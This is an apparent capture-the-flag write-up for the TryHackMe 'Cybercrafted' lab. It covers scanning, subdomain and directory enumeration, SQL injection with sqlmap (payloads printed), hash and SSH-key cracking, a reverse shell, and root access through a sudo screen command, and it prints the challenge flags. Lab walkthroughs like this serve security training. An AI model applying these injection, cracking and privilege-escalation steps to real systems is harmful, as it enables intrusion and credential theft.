Nmap scans:
```
┌─[root@edu-virtualbox]─[/home/edu/THM/cybercrafted]
└──╼ #nmap -A -p22,80,25565
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-27 11:51 CET
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.86 seconds
┌─[root@edu-virtualbox]─[/home/edu/THM/cybercrafted]
└──╼ #nmap -A -p22,80,25565 cybercrafted.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-27 11:52 CET
Nmap scan report for cybercrafted.thm (10.10.165.33)
Host is up (0.025s latency).

PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)
|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)
|_  256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (ED25519)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Cybercrafted
|_http-server-header: Apache/2.4.29 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

3 ports: `22, 80, 25565`

Note the `cybercrafted.thm` is a domain. so we perfrom a FFUF subdomain scan:
```
┌─[root@edu-virtualbox]─[/home/edu/THM/cybercrafted]                                                                                                                                                                                          
└──╼ #ffuf -u http://cybercrafted.thm -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.cybercrafted.thm' -fs 0                                                                                        
                                                                                                                                                                                                                                              
        /'___\  /'___\           /'___\                                                                                                                                                                                                       
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                                                                                       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                                                                                                      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                                                                                      
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                                                                                       
          \/_/    \/_/   \/___/    \/_/                                                                                                                                                                                                       
                                                                                                                                                                                                                                              
       v1.4.1-dev                                                                                                                                                                                                                             
________________________________________________                                                                                                                                                                                              
                                                                                                                                                                                                                                              
 :: Method           : GET
 :: URL              : http://cybercrafted.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cybercrafted.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 29ms]
admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 34ms]
store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 25ms]
```
3 subdomains.

In a Gobuster scan of the "store" subdomain, an interesting page popped up:
```
┌─[root@edu-virtualbox]─[/home/edu/THM]
└──╼ #gobuster dir -u http://store.cybercrafted.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.bak
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.cybercrafted.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,bak,php
[+] Timeout:                 10s
===============================================================
2023/01/27 12:46:39 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 403) [Size: 287]
/search.php           (Status: 200) [Size: 838]
/assets               (Status: 301) [Size: 333] [--> http://store.cybercrafted.thm/assets/]
```
`/search.php`

I used burp suite to capture a request:
```
POST /search.php HTTP/1.1
Host: store.cybercrafted.thm
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://store.cybercrafted.thm/search.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://store.cybercrafted.thm
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

search=a&submit=
```

Because it was looking through a database, I used `sqlmap`
```
┌─[root@edu-virtualbox]─[/home/edu/THM/cybercrafted]
└──╼ #sqlmap -r request.php -p search --batch -D webapp -T admin --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:51:08 /2023-01-27/

[12:51:08] [INFO] parsing HTTP request from 'request.php'
[12:51:08] [INFO] resuming back-end DBMS 'mysql' 
[12:51:08] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=a' AND (SELECT 8608 FROM (SELECT(SLEEP(5)))PGDg) AND 'wLDj'='wLDj&submit=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: search=a' UNION ALL SELECT NULL,NULL,CONCAT(0x7162707671,0x436a49717a41597a717a675749765867644151576f724a636c416f66756d49496b70774d4f62776a,0x716b717a71),NULL-- -&submit=
---
[12:51:09] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[12:51:09] [INFO] fetching columns for table 'admin' in database 'webapp'
[12:51:09] [INFO] fetching entries for table 'admin' in database 'webapp'
[12:51:09] [INFO] recognized possible password hashes in column 'hash'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[12:51:09] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[12:51:09] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[12:51:09] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[12:51:09] [INFO] starting 2 processes 
[12:51:33] [WARNING] no clear password(s) found                                                                                                                                                                                              
Database: webapp
Table: admin
[2 entries]
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 | xXUltimateCreeperXx |
| 4  | THM{bbe315906038c3a62d9b195001f75008}    | web_flag            |
+----+------------------------------------------+---------------------+

[12:51:33] [INFO] table 'webapp.admin' dumped to CSV file '/root/.local/share/sqlmap/output/store.cybercrafted.thm/dump/webapp/admin.csv'
[12:51:33] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/store.cybercrafted.thm'

[*] ending @ 12:51:33 /2023-01-27/
```


Credentials found:
`xXUltimateCreeperXx : 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01`
88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 looks like a hash, so I ran it through crackstation.
`88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01` is a `SHA1` hash for `diamond123456789`

I logged into the `admin.cybercrafted.thm` using the credentials, and accessed the admin console.
Using the `revshells.com` Python3 reverse shell I got system access as the `www-data` user.


Found `id_rsa`
```
-----BEGIN RSA PRIVATE KEY-----                                                                                        
Proc-Type: 4,ENCRYPTED                                                                                                 
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6                                                                 
                                                                                                                       
Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO                                                                                                                                                                              
Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
-----END RSA PRIVATE KEY-----
```
Used `ssh2john.py` and `john` to decrypt, password is `creepin2006`

Found passwords in `/opt/minecraft/cybercrafted`
```
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml 
cybercrafted: dcbf543ee264e2d3a32c967d663e979e
madrinch: 42f749ade7f9e195bf475f37a44cafcb
```
These are uncrackable MD5 hashes though.
Found in logs:
```
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt 

[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:25:16] cybercrafted registered. PW: JavaEdition>Bedrock
[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:47:34] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:29] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:54] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:58:46] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:59:01] madrinch logged in. PW: Password123


[2021/10/15 17:13:45] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 20:36:21] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 21:00:43] [BUKKIT-SERVER] Startet LoginSystem!
```
Password: `JavaEdition>Bedrock`
ran `sudo -l` :
```
cybercrafted@cybercrafted:~$ sudo -l
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted

```

After running the command, used `ctrl+a c`
```
# id        
uid=0(root) gid=1002(cybercrafted) groups=1002(cybercrafted)
# cat /root/root.txt
THM{8bb1eda065ceefb5795a245568350a70}
```
